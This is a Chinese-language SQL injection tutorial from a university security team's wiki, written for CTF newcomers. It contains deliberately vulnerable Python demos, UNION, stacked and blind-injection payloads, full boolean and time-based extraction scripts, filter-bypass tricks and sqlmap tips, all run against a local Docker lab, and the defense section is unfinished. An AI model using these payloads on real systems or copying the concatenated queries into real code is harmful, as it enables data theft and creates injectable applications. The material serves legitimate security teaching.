# SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入)

Author: `Liki4` from Vidar-Team

Vidar-Team 2023 招新 QQ 群：861507440（仅向校内开放）

Vidar-Team 官网：https://vidar.club/

Vidar-Team 招新报名表：https://reg.vidar.club/

本文中所有涉及的代码全部都托管在 https://github.com/Liki4/SQLi

## 前言[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#前言)

在当代优秀年轻程序员设计与编写 Web 应用的时候，或多或少会使用到一种叫数据库的东西，如字面意义，这种东西通常用来储存数据，例如用户的个人信息，账户名称和密码等。

当然这些东西即便用记事本也可以储存，只需要将数据输出到一个文本文件里，事后需要使用的时候再搜索即可。但当数据量逐渐庞大，又对数据的增删改查有所需求的时候，记事本就显得有些心有余而力不足了。

于是数据库诞生了，随之诞生了一种名为 SQL 的语言，用以对数据库进行增删改查和更多其他的操作。使用 SQL 语句，可以方便地从数据库中查询出想要的数据，可以方便地找出不同类型数据之间的联系并对他们进行一定的操作。例如当今天你没有做核酸的时候，某些系统就会找出你的个人信息，并对你的健康码进行一个改天换色，同时也将对你的出行码等信息造成影响，这其中所有的过程都离不开 SQL 语句的辛勤付出，因此对其进行研究是非常必要的 :-p

有关 SQL 语句的基本知识，可以参考 [SQL Tutorial](https://www.w3schools.com/sql/)

## 简介[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#简介)

在旧时代诞生的 Web 应用，不少都直接使用了原始 SQL 语句拼接的方式来完成查询，举个例子

python

```
def check_pass(username, password):
    hash = conn.exec(f"SELECT password FROM users WHERE username = '{username}'")
    return (sha256(password) == hash)
```

1
2
3

这是一个普通 Web 应用里常见的密码校验函数，的伪代码

从 `users` 表中查出 `username` 对应的 `password` 的哈希值，将其与用户传入的密码哈希值进行比对，若相等则意味着用户传入的密码与数据库中储存的密码相吻合，于是返回准许登录

![](C:\Users\24993\Desktop\博客文章\static\boxcnHiNBWN86AR4AvSSsUVwSWb.png)

那么问题来了，在语句

sql

```
SELECT password FROM users WHERE username = '{username}'
```

1

之中，如果参数 `username` 未经过校验，直接使用用户传入的原生字符串，会不会出现什么问题呢？

这就是本篇 SQL 注入要讨论的问题

## SQL 注入中的信息搜集[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入中的信息搜集)

### 信息的获取[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#信息的获取)

python

```
1. version() 数据库版本
2. user() 数据库用户名
3. database() 数据库名
4. @@datadir 数据库路径
5. @@version_compile_os 操作系统版本
```

1
2
3
4
5

### 字符串拼接[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#字符串拼接)

1. `concat(str1,str2,…)` 能够将你查询的字段连接在一起
2. `concat_ws(separator,str1,str2,)` 能够自定义分隔符来将你查询的字段链接在一起
3. `group_concat([DISTINCT] column [Order BY ASC/DESC column] [Separator separator])`

一般来说这个函数是配合 `group by` 子句来使用的，但是在 SQL 注入中，我们用他来输出查询出来的所有数据

python

```
mysql> select id, username, password from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.01 sec)

mysql> select concat(id,username,password) from users;
+------------------------------+
| concat(id,username,password) |
+------------------------------+
| 1DumbDumb                    |
| 2AngelinaI-kill-you          |
| 3Dummyp@ssword               |
| 4securecrappy                |
| 5stupidstupidity             |
| 6supermangenious             |
| 7batmanmob!le                |
| 8adminadmin                  |
| 9admin1admin1                |
| 10admin2admin2               |
| 11admin3admin3               |
| 12dhakkandumbo               |
| 14admin4admin4               |
+------------------------------+
13 rows in set (0.01 sec)

mysql> select concat(id,username,password) from users;
+------------------------------+
| concat(id,username,password) |
+------------------------------+
| 1DumbDumb                    |
| 2AngelinaI-kill-you          |
| 3Dummyp@ssword               |
| 4securecrappy                |
| 5stupidstupidity             |
| 6supermangenious             |
| 7batmanmob!le                |
| 8adminadmin                  |
| 9admin1admin1                |
| 10admin2admin2               |
| 11admin3admin3               |
| 12dhakkandumbo               |
| 14admin4admin4               |
+------------------------------+
13 rows in set (0.01 sec)

mysql> select group_concat(id,username separator '_') from users;
+--------------------------------------------------------------------------------------------------------------+
| group_concat(id,username separator '_')                                                                      |
+--------------------------------------------------------------------------------------------------------------+
| 1Dumb_2Angelina_3Dummy_4secure_5stupid_6superman_7batman_8admin_9admin1_10admin2_11admin3_12dhakkan_14admin4 |
+--------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67

## 前置知识[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#前置知识)

接着上一节的节奏走，如果我们传入的 `username` 参数中有单引号会发生什么呢

> 以下所举的例子都在 MySQL 5.x 版本完成

现在我们传入 `Liki4'` 这个字符串

![img](C:\Users\24993\Desktop\博客文章\static\boxcn8TrpE02fnPV7dFzkmnHiAe.png)

很遗憾，报错了，这个查询因为 SQL 语句存在语法错误而无法完成。

那么问题来了，怎么让他不报错的情况下完成查询呢？

在 MySQL 语句中， `#` 和 `--` 代表行间注释，与 C 语言的 `//` 和 Python 中的 `#` 是同样的意思。也就是说，一个 MySQL 语句中如果存在 `#` 和 `--` ，那么这一行其后的所有字符都将视为注释，不予执行。

那如果我们传入 `Liki4';#` 这个字符串，那么在拼接后的查询又是什么结果呢

![img](C:\Users\24993\Desktop\博客文章\static\boxcnbAKreqEeZxOYQuQMtZbd9d.png)

很显然， `#` 号将原本语句的 `';` 注释掉了

而我们传入的字符串构成了全新的语法正确的语句，并完成了一次查询！

那我们是否可以查询一些... 不属于我们自己的信息呢？答案是可以的。

例如我们传入一个精心构造的字符串

```
raw_sql_danger' UNION SELECT password FROM users WHERE username = 'Liki5';#
```

![img](C:\Users\24993\Desktop\博客文章\static\boxcniDohuM3F8FbMqz7YSC0Y5g.png)

**真是惊人的壮举！我完全不认识这个叫 Liki5 的家伙，但我居然知道了他的密码对应的哈希值！**

~~那么到这里 SQL 注入你就已经完全学会了，接下来做一些小练习吧。~~

~~请挖掘 Django ORM 最新版本的注入漏洞并与我分享，我会请你喝一杯奶茶作为谢礼。~~

## SQL 注入入门[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入入门)

接下来的举例几乎都不会以 Web 的形式出现，虽然你去看别的文档都是起个 Web 应用，但我懒

反正都是一样的东西，是否以 Web 应用的形式没差，请不要来杠

### SQL 注入的常见类型[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入的常见类型)

SQL 注入的常见类型分为以下几种，在后面的章节里会慢慢地讲述不同类型的区别和攻击手法

按照攻击手法来分类可以分为以下几种

1. 有回显的 SQL 注入
2. 无回显的 SQL 盲注
3. 布尔盲注
4. 时间盲注
5. 基于报错的 SQL 注入
6. 堆叠注入
7. 二次注入

按照注入点来分类可以分为以下几种

1. 字符型注入
2. 数字型注入

注入点的分类只在于语句构造时微小的区别，因此不作详细的说明

当然，不同的数据库后端因为其不同的内置函数等差异，有着不同的攻击手法，但都大同小异。

常见的数据库有下列几个

1. MySQL
2. MSSQL
3. OracleDB
4. SQLite

当然还有一些新兴的~~前沿科技~~数据库

1. ClickHouse
2. PostgreSQL

还有一些和传统数据库设计理念不一样的 noSQL 数据库

1. MongoDB
2. AmazonRD
3. ...

后续的章节里，会采用入门时最常见的 MySQL 数据库来举例，环境可以用 Docker 简单地创建一个

yaml

```
# docker-compose.yml
# docker-compose up -d --build

version: "3.8"
services:
    db:
        image: mysql:5.7
        container_name: "mysql5-docker"
        command: --default-authentication-plugin=mysql_native_password --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci --sql-mode=''
        ports:
            - "3305:3306"
        environment:
            - MYSQL_ROOT_PASSWORD=TjsDgwGPz5ANbJUU
        healthcheck:
            test: ["CMD", "mysqladmin" ,"ping", "-h", "localhost"]
            interval: 2s
            timeout: 5s
            retries: 30
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18

### 有回显的 SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#有回显的-sql-注入)

我这里写了一个小 demo 来进行展示，demo 代码如下，为了好看我用 prettytable 格式化了输出

python

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-

from sqlalchemy import create_engine
from prettytable import from_db_cursor

engine = create_engine("mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli", max_overflow=5)

def query(username):
    with engine.connect() as con:
        cur = con.execute(f"SELECT * FROM users WHERE username = '{username}'").cursor
        x = from_db_cursor(cur)
        return(x)    # 返回查询的结果

def main():
    username = input("Give me your username: ")
    print(query(username))

if __name__ == "__main__":
    main()
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20

接下来我们进行一次常规查询

![img](C:\Users\24993\Desktop\博客文章\static\boxcnpCCmEi6LIKNi0UqEkXfJ8g.png)

可以看到我们成功从数据库中查出了 `username` 和 `password` ，并显示在返回中

现在我们构造一些恶意语句，比如 `123' UNION SELECT 1, 2;#`

现在我们将执行的语句打印出来看看，对代码进行一些小改动

bash

```
...
def query(username):
    with engine.connect() as con:
        query_exec = f"SELECT * FROM users WHERE username = '{username}'"
        print(query_exec)
        cur = con.execute(query_exec).cursor
        x = from_db_cursor(cur)
        return(x)
...
```

1
2
3
4
5
6
7
8
9

![img](C:\Users\24993\Desktop\博客文章\static\boxcnbaW15gnJc1O9Iv9WXqJxPc.png)

可以看到，实际执行的语句为

sql

```
SELECT * FROM users WHERE username = '123' UNION SELECT 1, 2;#'
```

1

也就是说，在这个 demo 中，从数据库查询的内容会直接返回给用户，用户可以直接看到查询的内容

那我们是否可以进行一些其他的查询呢

构造语句 `123' UNION SELECT DATABASE(), @@version;#`

![img](C:\Users\24993\Desktop\博客文章\static\boxcnDeDp5yPE7W4KX9ByBl9ovh.png)

我们就能看到返回中包含了当前数据库名与当前数据库版本

如果数据库中除了 `users` 表还有其他的东西，我们是否能通过这个注入来获取呢...

构造语句 `123' UNION SELECT table_name, column_name FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE();#`

> `information_schema` 库是一个 MySQL 内置数据库，储存了数据库中的一些基本信息，比如数据库名，表名，列名等一系列关键数据，SQL 注入中可以查询该库来获取数据库中的敏感信息。

![img](C:\Users\24993\Desktop\博客文章\static\boxcnkwvSnhKBhlHNLOSthgul9d.png)

我们可以发现，当前数据库中还存在一张叫 `secret` 的表，让我们偷看一下里面存的是什么

构造语句 `123' UNION SELECT 1, secret_string FROM secret;#`

![img](C:\Users\24993\Desktop\博客文章\static\boxcn3kfhJ79ByNML2Z1Q1MwRye.png)

好像得到了什么不得了的秘密 😃

### 无回显的 SQL 盲注[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#无回显的-sql-盲注)

#### 布尔盲注[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#布尔盲注)

我们对有回显的 SQL 注入的 demo 进行一点修改，代码如下

python

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-

from sqlalchemy import create_engine
from hashlib import sha256

engine = create_engine("mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli", max_overflow=5)

def query(username, password):
    with engine.connect() as con:
        query_exec = f"SELECT password FROM users WHERE username = '{username}'"
        print(query_exec)
        if con.execute(query_exec).scalar():
            passhash = con.execute(query_exec).fetchone()[0]
            return passhash == sha256(password.encode()).hexdigest()
        return False

def main():
    username = input("Give me your username: ")
    password = input("Give me your password: ")
    print("Login success" if query(username, password) else "Login failed")
    # 不再显示查询结果，而返回 success 或 failed

if __name__ == "__main__":
    main()
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25

这样一来我们就只能知道自己是否登录成功，并不能看到查询返回的结果了

![img](C:\Users\24993\Desktop\博客文章\static\boxcn2seUNESHkLC9PYvDp0vFbe.png)

那也就是说，我们无法直观地查看数据库中的数据了，即便查出了不该查的也看不到了 😦

那有没有什么办法击破这个限制呢？是时候该本章的主角，布尔盲注出场了

观察程序的逻辑，如果查询特定用户的密码与用户的输入匹配，则登陆成功，否则登陆失败

我们是否能控制语句是否将对应用户的密码查询出来呢？

在 MySQL 中有一种格式为 `if(expression, if_true, if_false)` 的分支语句

类比 Python 则可以写成

python

```
if (expression):
    if_true
else:
    if_false
```

1
2
3
4

如果我们可以通过 `if` 语句来控制整个 SQL 语句是否查询成功，不就可以获取一些信息了吗？

当 if 语句为真时才将对应用户的密码查询出来，这样一来就能够通过用户验证，结果即为登陆成功

当 if 语句为假时则不将对应用户的密码查询出来，程序无从比对，也就无法通过用户验证了

有点抽象？没关系继续往下看。

构造语句 `Liki4' and if(@@version rlike '^5',1,0);#`

> rlike 是 MySQL 中的一个关键字，是 regex 和 like 的结合体

![img](C:\Users\24993\Desktop\博客文章\static\boxcnJEeAKow3ZhUSvbL4FQXxOh.png)

这里实际执行的语句就变成了

sql

```
SELECT password FROM users WHERE username = 'Liki4' AND if(@@version rlike '^5',1,0);
```

1

![img](C:\Users\24993\Desktop\博客文章\static\boxcnJ3jImTQcMUOWJclTACj74e.png)

sql

```
SELECT password FROM users WHERE username = 'Liki4' AND if(@@version rlike '^8',1,0);
```

1

![img](C:\Users\24993\Desktop\博客文章\static\boxcnEDPFbKQ6iaM5WhHWUWmI5d.png)

也就是说，当 if 语句中的条件为真时，这个查询才会将 password 查询出来

如果 if 语句为假，这个条件为假的查询就不成立，查询的结果也为空了

从上面这个例子里我们就可以得出当前 MySQL 为 MySQL 5

如此一来我们就可以通过枚举爆破得到数据库名，表名，列名，进而得到数据库中存储的数据了

其中关键的语句如下

sql

```
if(DATABASE() rlike '^{exp}',1,0) # 获取数据库名
if((SELECT GROUP_CONCAT(table_name, ':', column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) rlike '^{exp}',1,0) # 获取表名与字段名
if((SELECT binary GROUP_CONCAT(secret_string) FROM secret) rlike '^{exp}',1,0) # 获取存储的数据
```

1
2
3

完整 exp 如下

python

```
from mysqli_invisible_bool import *
import string
import io
import sys

def escape_string(c):
    return "\\" + c if c in ".+*" else c

def exp():
    payload_template = "Liki4' AND if({exp},1,0);#"
    space = string.ascii_letters + string.digits + ' _:,$.'

    exp_template = "@@version RLIKE '^{c}'"
    exp_template = "DATABASE() RLIKE '^{c}'"
    exp_template = "(SELECT GROUP_CONCAT(table_name, ':', column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE '^{c}'"
    exp_template = "(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE '^{c}'"

    print(exp_template)

    Flag = True

    data = ""

    while Flag:
        ori_stdout = sys.stdout
        for c in space:
            payload = payload_template.format(exp=exp_template.format(c=data+c))
            sys.stdin = io.StringIO(payload + '\n123\n')
            res = sys.stdout = io.StringIO()
            main()
            output = str(res.getvalue())
            if "failed" in output:
                continue
            if c == "$":
                Flag = False
                break
            if "success" in output:
                data += c
                break
        sys.stdout = ori_stdout
        if Flag:
            print(data, end="\r")
        else:
            print(data)

if __name__ == "__main__":
    exp()
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47

![img](C:\Users\24993\Desktop\博客文章\static\boxcnXyMaLh26lkNuAPiQVHuaNg.png)

#### 时间盲注[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#时间盲注)

时间盲注的场景和原理与布尔盲注类似，都是在没有回显查询结果的时候使用的

能用布尔盲注的地方一般都能用时间盲注，但能用时间盲注的地方不一定能用布尔盲注

有的场景在完全没有回显，甚至没有能表示语句是否查询完成的东西存在时，时间盲注就派上用场了

这里可以直接沿用布尔盲注的场景

python

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-

from sqlalchemy import create_engine
from hashlib import sha256

engine = create_engine("mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli", max_overflow=5)

def query(username, password):
    with engine.connect() as con:
        query_exec = f"SELECT password FROM users WHERE username = '{username}'"
        print(query_exec)
        if con.execute(query_exec).scalar():
            passhash = con.execute(query_exec).fetchone()[0]
            return passhash == sha256(password.encode()).hexdigest()
        return False

def main():
    username = input("Give me your username: ")
    password = input("Give me your password: ")
    print("Login success" if query(username, password) else "Login failed")

if __name__ == "__main__":
    main()
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24

如果想要让布尔盲注不可用，我们可以做一个假设，假设我们并不知道账户的密码，也就无法通过登陆验证，这个时候就失去了布尔盲注最大的依赖，也就无法得知 if 表达式的真或假了。

![img](C:\Users\24993\Desktop\博客文章\static\boxcndxf4WEQQQEXspS7GwNKI6J.png)

但，真的没办法了吗？

在 MySQL 中存在一个延时函数 sleep ()，可以延时特定的秒数

如果我们将 if 语句中的返回值改成延时函数会如何呢？

当 if 语句为真时进行一个延时，当 if 语句为假时即刻返回

于是我们就可以通过查询进行的时间长短来判断语句是否为真了！

完整的 exp 如下

python

```
from mysqli_invisible_time import *
import string
import io
import sys
import signal

def handler(signum, frame):
    raise Exception("timeout")

signal.signal(signal.SIGALRM, handler)

def escape_string(c):
    return "\\" + c if c in ".+*" else c

def exp():
    payload_template = "Liki4' AND if({exp},SLEEP(1),0);#"
    space = string.ascii_letters + string.digits + ' _:,$.'

    exp_template = "@@version RLIKE '^{c}'"
    exp_template = "DATABASE() RLIKE '^{c}'"
    exp_template = "(SELECT GROUP_CONCAT(table_name, ':', column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE '^{c}'"
    exp_template = "(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE '^{c}'"

    print(exp_template)

    Flag = True

    data = ""

    while Flag:
        ori_stdout = sys.stdout
        for c in space:
            payload = payload_template.format(exp=exp_template.format(c=data+c))
            sys.stdin = io.StringIO(payload + '\n555_i_dont_know_password')
            res = sys.stdout = io.StringIO()

            signal.alarm(1)
            try:
                main()
                print("timeout")
            except:
                print("bingooo")
            
            output = str(res.getvalue())
            if "timeout" in output:
                continue
            if c == "$":
                Flag = False
                break
            if "bingooo" in output:
                data += c
                break
        sys.stdout = ori_stdout
        if Flag:
            print(data, end="\r")
        else:
            print(data)

if __name__ == "__main__":
    exp()
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60

![img](C:\Users\24993\Desktop\博客文章\static\boxcnsStdHC5VmBylyx6S7hakEb.png)

### 基于报错的 SQL 注入 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#基于报错的-sql-注入-todo)

有的时候当 Web 应用虽然没有回显，但开启了 Debug 模式或者开启了显示报错的话，一旦 SQL 语句执行报错了，那么就会将错误信息显示出来，那报错的信息能否成为一种带出关键信息的回显呢？

可以！

让我们再对 demo 的代码做一些修改，用来探究以下如何利用报错来外带信息。

python

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-

from sqlalchemy import create_engine, exc
from hashlib import sha256

engine = create_engine("mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli", max_overflow=5)

def query(username, password):
    with engine.connect() as con:
        query_exec = f"SELECT password FROM users WHERE username = '{username}'"
        print(query_exec)
        try:
            if con.execute(query_exec).scalar():
                passhash = con.execute(query_exec).fetchone()[0]
                return passhash == sha256(password.encode()).hexdigest()
        except exc.SQLAlchemyError as e:
            print(str(e.__dict__['orig'])) # 输出捕获的错误信息
        return False

def main():
    username = input("Give me your username: ")
    password = input("Give me your password: ")
    print("Login success" if query(username, password) else "Login failed")

if __name__ == "__main__":
    main()
```

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27

![img](C:\Users\24993\Desktop\博客文章\static\boxcnl67uDDSIdh3J7y7Jxjk0dc.png)

这样一来如果 SQL 语句执行报错的话，错误信息就会被打印出来

我收集了十个在 MySQL 中常见的可以用来进行报错注入的函数，我将他们常见的攻击手法都整理一下，放在底下供大家参考，原理和先前的有回显注入的方式并无区别。

关于函数的原型与定义可以翻阅 MySQL 文档

MySQL 5.7 doc: https://dev.mysql.com/doc/refman/5.7/en/

MySQL 8.0 doc: https://dev.mysql.com/doc/refman/8.0/en/

需要注意的是旧版本的某些函数在新版本中可能已经失效，具体在这里不一一列举

1. `floor`
2. `extractvalue`
3. `updatexml`
4. `geometrycollection`
5. `multipoint`
6. `polygon`
7. `multipolygon`
8. `linestring`
9. `multilinestring`
10. `exp`

### 堆叠注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#堆叠注入)

当注入点使用的执行函数允许一次性执行多个 SQL 语句的时候，例如 PHP 中的 `multi_query` ，堆叠注入即存在。堆叠注入相较于其他方式，利用的手法更加自由，不局限于原来的 SELECT 语句，而可以拓展到 INSERT、SHOW、SET、UPDATE 语句等。

```
Liki4';INSERT INTO users VALUES ('Liki3','01848f8e70090495a136698a41c5b37406968c648ab12133e0f256b2364b5bb5');#
```

![img](C:\Users\24993\Desktop\博客文章\static\boxcnrMIc2m6oubxC86CEtw1jMe.png)

![img](C:\Users\24993\Desktop\博客文章\static\boxcnVRdntvakiTpt7nP8JhKKfc.png)

INSERT 语句也被成功执行了，向数据库中插入了 Liki3 的数据

### 二次注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#二次注入)

二次注入的原理与前面所有的注入方式一致，仅仅在于触发点不同。

在某些 Web 应用中，注册时对用户的输入做了良好的预处理，但在后续使用的过程中存在未做处理的注入点，此时即可能造成二次注入

常见的场景，例如某平台在用户注册时无法进行 SQL 注入利用，但在登陆后的用户个人信息界面进行数据查询时存在可利用的注入点。

那么我们在注册的时候即便无法当即触发 SQL 注入，但可以将恶意 payload 暂时写入到数据库中，这样一来当我们访问个人信息界面查询这个恶意 payload 的时候即会在可利用的注入点触发 SQL 注入。

## SQL 注入常见的过滤绕过方式[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入常见的过滤绕过方式)

### 空格被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#空格被过滤)

1. `/*xxx*/` MySQL 行内注释

```
SELECT/*1*/username,password/*1*/FROM/*1*/users;
```

1. `()`

```
SELECT(username),(password)FROM(users);
```

1. `%20 %09 %0a %0b %0c %0d %a0 %00` 等不可见字符

### 引号被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#引号被过滤)

1. 十六进制代替字符串

```
SELECT username, password FROM users WHERE username=0x4c696b6934
```

### 逗号被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#逗号被过滤)

1. `from for`

```
select substr(database(),1,1);
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

1. `join`

```
select 1,2
select * from (select 1)a join (select 2)b
```

1. `like/rlike`

```
select ascii(mid(user(),1,1))=80
select user() like 'r%'
```

1. `offset`

```
select * from news limit 0,1
select * from news limit 1 offset 0
```

### 比较符号 `(<=>)` 被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#比较符号-被过滤)

1. `=` 用 `like, rlike, regexp` 代替

```
select * from users where name like 'Liki4'
select * from users where name rlike 'Liki4'
select * from users where name regexp 'Liki4'
```

1. `<>` 用 `greatest()、least()`

```
select * from users where id=1 and ascii(substr(database(),0,1))>64
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

1. `between`

```
select * from users where id between 1 and 1;
```

### `or and xor not` 被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#or-and-xor-not-被过滤)

1. `and = &&`
2. `or = ||`
3. `xor = |`
4. `not = !`

### 常用函数被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#常用函数被过滤)

1. `hex()、bin() = ascii()`
2. `sleep() = benchmark()`
3. `concat_ws() = group_concat()`
4. `mid()、substr() = substring()`
5. `@@user = user()`
6. `@@datadir = datadir()`

### 宽字节注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#宽字节注入)

在 GB2312、GBK、GB18030、BIG5、Shift_JIS 等编码下来吃掉 ASCII 字符的方法，可以用来绕过 `addslashes()``id=0%df%27%20union%20select%201,2,database();`

![img](C:\Users\24993\Desktop\博客文章\static\boxcnaRtyUGC0sX3btnFIgpDCob.png)

### information_schema 被过滤[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#information-schema-被过滤)

在 SQL 注入中， `infromation_schema` 库的作用无非就是可以获取到 `table_schema, table_name, column_name` 这些数据库内的信息。

#### MySQL 5.6 的新特性[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#mysql-5-6-的新特性)

在 MySQL 5.5.x 之后的版本，MySQL 开始将 innoDB 引擎作为 MySQL 的默认引擎，因此从 MySQL 5.6.x 版本开始，MySQL 在数据库中添加了两张表， `innodb_index_stats` 和 `innodb_table_stats` ，两张表都会存储数据库和对应的数据表。

因此，从 MySQL 5.6.x 开始，有了取代 `information_schema` 的表名查询方式，如下所示

python

```
select table_name from mysql.innodb_index_stats where database_name=*database*();
select table_name from mysql.innodb_table_stats where database_name=*database*();
```

1
2

![img](C:\Users\24993\Desktop\博客文章\static\boxcnbMtjAq8osStjcSbFuIdDSc.png)

#### MySQL 5.7 的新特性[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#mysql-5-7-的新特性)

由于 `performance_schema` 过于发杂，所以 MySQL 在 5.7 版本中新增了 `Sys schema` 视图，基础数据来自于 `performance_chema` 和 `information_schema` 两个库。

而其中有这样一个视图， `schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer` ，我们可以翻阅官方文档对其的解释

> 查询表的统计信息，其中还包括 InnoDB 缓冲池统计信息，默认情况下按照增删改查操作的总表 I/O 延迟时间（执行时间，即也可以理解为是存在最多表 I/O 争用的表）降序排序，数据来源：performance_schema.table_io_waits_summary_by_table、sys.x、����ℎ��������������������、���.�innodb_buffer_stats_by_table

其中就包含了存储数据库和对应的数据表，于是就有了如下的表名查询方式

sql

```
select table_name from sys.schema_table_statistics_with_buffer where table_schema=*database*();
select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=*database*();
```

1
2

![img](C:\Users\24993\Desktop\博客文章\static\boxcnV68mdIQmovJwczDsOc53gc.png)

### 无列名注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#无列名注入)

在因为 `information_schema` 被过滤或其他原因无法获得字段名的时候，可以通过别名的方式绕过获取字段名的这一步骤

```
select a,b from (select 1 as a, 2 as b union select * from users)x;
```

![img](C:\Users\24993\Desktop\博客文章\static\boxcnI3jJNlLqq4f7WqRKGEWTeh.png)

## 超脱 MySQL 之外 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#超脱-mysql-之外-todo)

### 不同数据库后端的判别[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#不同数据库后端的判别)

虽然在以往的 CTF 比赛中，MySQL 的出镜率非常高，但在绝大多数的生产环境中（起码在国内），OracleDB、MSSQL 等数据库是绝对的占有率霸主。而一些大型互联网企业则可能使用的是更新的 “高新技术”，例如 ClickHouse、PostgreSQL、MongoDB 等。

那么如何去判别一个 Web 应用的数据库后端用的是什么呢？

这一小节就来简单地讲一讲一些针对这种情况的常见方法。

### 各数据库的攻击面拓展[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#各数据库的攻击面拓展)

### noSQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#nosql-注入)

工具 nosqlmap

## SQL 注入防范手段 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#sql-注入防范手段-todo)

## 一些 CVE 复现 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#一些-cve-复现-todo)

### ThinkPHP SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#thinkphp-sql-注入)

### Django SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#django-sql-注入)

### Gorm SQL 注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#gorm-sql-注入)

## 数据库注入工具 SQLMAP 及其高级使用指南[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#数据库注入工具-sqlmap-及其高级使用指南)

> 这里不讨论诸如 -u 这种简单参数

### 一些特殊参数[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#一些特殊参数)

#### -r [文件名][](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#r-文件名)

当你从 Burp 之类的工具中发现了 数据库注入的痕迹

可以全选右键保存你发送有效载荷（含有 Sql 注入的语句）的明文报文

复制到文件中保存

使用 -r 后跟保存的文件 sqlmap 会自动获得发送恶意报文的神奇能力（x 其实是自动解析了）

